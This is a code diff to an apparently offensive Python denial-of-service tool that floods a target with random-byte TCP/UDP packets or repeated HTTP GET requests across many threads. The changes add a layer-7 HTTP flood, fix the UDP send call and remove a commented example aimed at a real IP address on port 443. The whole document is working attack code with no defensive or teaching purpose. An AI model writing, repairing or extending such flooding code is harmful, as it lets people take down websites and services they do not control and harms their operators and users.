@@ -1,10 +1,12 @@
 import argparse
 import os
 import socket
+from struct import pack
 from urllib.parse import urlparse
 import random
 import time 
 import threading
+import ssl 
 
 class Sockets(object):
     def __init__(self, ip, port, time, protocol, osi, threads) -> None: 
@@ -15,9 +17,11 @@ class Sockets(object):
         self.max_threads = 950
         self.max_time = 3600
         self.debugging = False
+        self.url = osi == 7 and urlparse(ip).hostname or None
         self.rpc = 150 
         self.layer = osi 
         self.threads = threads 
+        self.socket_timeout = 3
         self.sleep_time = .1
         self.ip = self.layer == 7 and socket.gethostbyname(urlparse(ip).hostname) or ip
         self.port = port 
@@ -31,9 +35,10 @@ class Sockets(object):
 
     def check_parameters(self):
         try:
-            socket.gethostbyname(self.ip)
-            if self.debugging:
-                print('[+] Verified IP')
+            if self.layer == 7:
+                socket.gethostbyname(self.ip)
+                if self.debugging:
+                    print('[+] Verified IP')
         except Exception as e:
             return False 
         if self.port > 65535:
@@ -74,21 +79,28 @@ class Sockets(object):
             sock = self.protocol == "UDP" and socket.socket(socket.AF_INET, socket.SOCK_DGRAM) or socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             if self.protocol == "TCP":
                 try:
-                    sock.connect((self.ip, self.port))
+                    if self.layer == 4:
+                        sock.connect((self.ip, self.port))
+                    else:
+                        sock.connect((self.url, self.port))
                     for _ in range(self.rpc):
                         packet = None 
                         if self.layer == 7:
-                            packet = ""
+                            packet = "GET / HTTP/1.1\r\nHost:%s\r\n\r\n" % self.url
+                            sock.send(str.encode(packet))
+                            sock.close()
+                            break
                         else:
                             packet = os.urandom(random.randint(1, 1024))
-                        sock.sendto(packet, (self.ip, self.port))
+                            sock.send(packet)
                     sock.close()
                 except Exception as e:
+                    print(str(e))
                     sock.close()
             else:
                 try:
                     for _ in range(self.rpc):
-                        sock.sendto(os.urandom(random.randint(1, 1024), (self.ip, self.port)))
+                        sock.sendto(os.urandom(random.randint(1, 1024)), (self.ip, self.port))
                     sock.close()
                 except Exception as e:
                     time.sleep(self.sleep_time)
@@ -142,6 +154,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-#f = Sockets("http://176.9.16.251/", 443 , 20 , "TCP", 7, 45) # ip, port , time , protocol , layer 4 / 7 , threads
-#f.send_flood()
-#print(f.check_parameters())	
